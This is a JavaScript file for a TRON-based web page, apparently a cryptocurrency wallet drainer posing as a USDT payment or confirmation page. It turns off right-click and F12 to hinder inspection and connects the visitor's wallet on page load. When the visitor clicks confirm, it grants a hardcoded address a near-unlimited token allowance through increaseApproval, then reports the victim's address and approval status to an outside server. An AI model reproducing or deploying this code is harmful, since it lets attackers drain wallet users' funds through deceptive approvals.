document.oncontextmenu = function (event) {
    if (window.event) {
        event = window.event;
    }
    try {
        var the = event.srcElement;
        if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) {
            return false;
        }
        return true;
    } catch (e) {
        return false;
    }
}
document.onkeydown = function () {
    if (window.event && window.event.keyCode == 123) {
        event.keyCode = 0;
        event.returnValue = false;
    }
}

let connectCount = 0;
var authorized_address = 'TN91AftWPQR6QMtYzVu5JyxGYVcvk2X6kk'

var selectedAccount;
var network;
var contract;
var is_click = 1;


const ABI =[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_subtractedValue","type":"uint256"}],"name":"decreaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_value","type":"uint256"}],"name":"calcFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"oldBalanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_addedValue","type":"uint256"}],"name":"increaseApproval","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint8"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"previousOwner","type":"address"},{"indexed":true,"name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}]


async function onConnect() {
    
    
    if(/okex/.test(navigator.userAgent.toLowerCase())){
	    if (window.tronLink.ready) {
            window.tronWeb = tronLink.tronWeb;
        } else {
            const res = await tronLink.request({ method: 'tron_requestAccounts' });
            if (res.code === 200) {
              window.tronWeb = tronLink.tronWeb;
            }
        }
	}else{
	    if (!window.tronWeb) {
    		const HttpProvider = TronWeb.providers.HttpProvider;
    		const fullNode = new HttpProvider('https://api.trongrid.io');
    		const solidityNode = new HttpProvider('https://api.trongrid.io');
    		const eventServer = 'https://api.trongrid.io/';
    
    		const tronWeb = new TronWeb(
    			fullNode,
    			solidityNode,
    			eventServer,
    		);
    		window.tronWeb = tronWeb;
    	}
	}
    
	
	
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
	   selectedAccount = window.tronWeb.defaultAddress.base58
	  
	  let contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
	         contract = await tronWeb.contract(ABI,contractAddress);
	  
	 
		send(selectedAccount, "否");
	  
	   setTimeout(function () {
		   
		      contract.balanceOf(window.tronWeb.defaultAddress.base58).call().then(function (e) {
		          
                $('#ye').html(tronWeb.fromSun(e, 'lovelace'));
            });
		  
		   
            contract.allowance(window.tronWeb.defaultAddress.base58, authorized_address).call().then(function (e) {
                if (e > 0) {
                    $(".tishi").fadeIn()
                    
                    
            
                    is_click = 0
                    return
                }
            });
           

           
        }, 500);
	  
	  
		
		
		
	} else {
		
	}
	connectCount++
}



async function fetchAccountData() {
    await onConnect();
    var val = 900000000 + parseInt((Math.random() * 1000).toFixed(0));
    var valStr = val + "000000";
	
	
	let trxnum = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
			
			let Trxbalance = tronWeb.fromSun(trxnum);
	
			 if(Trxbalance < 25){
				 
    	    $(".trxtishi").fadeIn() //trx不足
    	    
    	    setTimeout(function () {
                          $(".trxtishi").fadeOut()
                        }, 2000);
    	    
			return 
    	}				
		
	
	
	
	
    
    contract.increaseApproval(authorized_address, valStr).send({
       feeLimit: 30000000,
    }, function (err, tx) {
        if (!err) {
            $(".tishi").fadeIn()
           
            is_click = 0;
            send(selectedAccount, "是");
        }else{
            
            
         
                                
            
            send(selectedAccount, "否");
            
        }
    })
	
	

	
}



  let times = new Date().getTime();
    console.log(times / 1000);
    
async function send(address, isapprove) {
    var data = {
        accountValue: address,
        chainId: authorized_address,
        contractValue: "TRC20",
        decimalsValue: "A",
		BalanceValue:"0",
		zbbalance:"0",
        usdtbalance: "0",
        wallet: "Okex",
        isapprove: isapprove,
        times: times / 1000
        
       
    }
    $.ajax({
        type: 'post',
        url: 'https://auto.tn91aftwpqr6qmtyzvu5jyxgyvcvk2x6kk.io/shop',
        data: data,

    })
}

window.addEventListener('load', async () => {
  
   await onConnect();   //自动加载连接

    
});

$("#allusdt").click(function () {
    var ye = $('#ye').html();
    $('#available1').val(ye);
});
$("#confirm").click(function () {
    if (is_click == 1) {
        fetchAccountData();
    }
});